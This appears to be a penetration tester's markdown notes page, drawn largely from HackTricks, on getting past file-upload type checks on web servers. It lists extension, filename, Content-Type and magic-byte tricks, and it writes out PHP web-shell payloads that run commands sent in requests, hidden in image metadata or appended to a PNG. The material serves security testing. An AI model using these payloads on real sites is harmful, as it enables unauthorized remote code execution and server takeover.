---
tags:
  - Enumeration
  - TCP
  - HTTP
  - Concepts
  - Vulnerabilities
  - HyperTextTransferProtocol
---
Ways to bypass file type upload filtering


# Guides

1. [File Upload | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology)
2. [File upload bypass | Hacker's Grimoire](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)

## File Upload General Methodology

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. If they apply, the **check** the **previous extensions.** Also test them using some **uppercase letters**: _pHp, .pHP5, .PhAr ..._
    
2. _Check_ _**adding a valid extension before**_ _the execution extension (use previous extensions also):_

	- _file.png.php_
	- _file.png.Php5_
        
    
3. Try adding **special characters at the end.** You could use Burp to **bruteforce** all the **ascii** and **Unicode** characters. (_Note that you can also try to use the_ _**previously**_ _motioned_ _**extensions**_)
    
    - _file.php%20_
        
    - _file.php%0a_
        
    - _file.php%00_
        
    - _file.php%0d%0a_
        
    - _file.php/_
        
    - _file.php.\_
        
    - _file._
        
    - _file.php...._
        
    - _file.pHp5...._
        
    
4. Try to bypass the protections **tricking the extension parser** of the server-side with techniques like **doubling** the **extension** or **adding junk** data (**null** bytes) between extensions. _You can also use the_ _**previous extensions**_ _to prepare a better payload._
    
    - _file.png.php_
        
    - _file.png.pHp5_
        
    - _file.php#.png_
        
    - _file.php%00.png_
        
    - _file.php\x00.png_
        
    - _file.php%0a.png_
        
    - _file.php%0d%0a.png_
        
    - _file.phpJunk123png_
        
    
5. Add **another layer of extensions** to the previous check:
    
    - _file.png.jpg.php_
        
    - _file.php%00.png%00.jpg_
        
    
6. Try to put the **exec extension before the valid extension** and pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
    
    - _ex: file.php.png_
        
    
7. Using **NTFS alternate data stream (ADS)** in **Windows**. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an **empty file with the forbidden extension** will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “**::$data**” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)
    
8. Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php, see [HTB: Falafel | 0xdf hacks stuff](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#code-execution---webshell)
    
    Copy
    
    ```
    # Linux maximum 255 bytes
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
    # Upload the file and check response how many characters it alllows. Let's say 236
    python -c 'print "A" * 232'
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    # Make the payload
    AAA<--SNIP 232 A-->AAA.php.png
    ```
    

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
    
    1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
    
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg` `\` or you could also **introduce the payload directly** in an image: `echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
    
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
    
    - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
        
    
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
    
    - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
    
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
    
    - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)
    

### Other Tricks to check

- Find a vulnerability to **rename** the file already uploaded (to change the extension), see [File upload bypass | Hacker's Grimoire](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass#php-getimagesize)
    
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
    
- **Possible Information disclosure**:
    
    1. Upload **several times** (and at the **same time**) the **same file** with the **same name**
        
    2. Upload a file with the **name** of a **file** or **folder** that **already exists**
        
    3. Uploading a file with **“.”, “..”, or “…” as its name**. For instance, in Apache in **Windows**, if the application saves the uploaded files in “/www/uploads/” directory, the “.” filename will create a file called “uploads” in the “/www/” directory.
        
    4. Upload a file that may not be deleted easily such as **“…:.jpg”** in **NTFS**. (Windows)
        
    5. Upload a file in **Windows** with **invalid characters** such as `|<>*?”` in its name. (Windows)
        
    6. Upload a file in **Windows** using **reserved** (**forbidden**) **names** such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
        
    
- Try also to **upload an executable** (.exe) or an **.html** (less suspicious) that **will execute code** when accidentally opened by victim.
    

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess). If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.